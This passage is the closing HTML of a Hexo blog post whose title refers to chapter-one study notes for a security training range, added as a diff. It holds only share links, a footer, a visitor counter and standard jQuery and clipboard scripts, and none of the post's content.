+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=玄机靶场第一章学习笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=玄机靶场第一章学习笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=玄机靶场第一章学习笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=玄机靶场第一章学习笔记&body=Check out this article: https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=玄机靶场第一章学习笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=玄机靶场第一章学习笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=玄机靶场第一章学习笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=玄机靶场第一章学习笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=玄机靶场第一章学习笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://chimedal.github.io/2025/04/03/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=玄机靶场第一章学习笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Chimedal
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/link/">Link</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
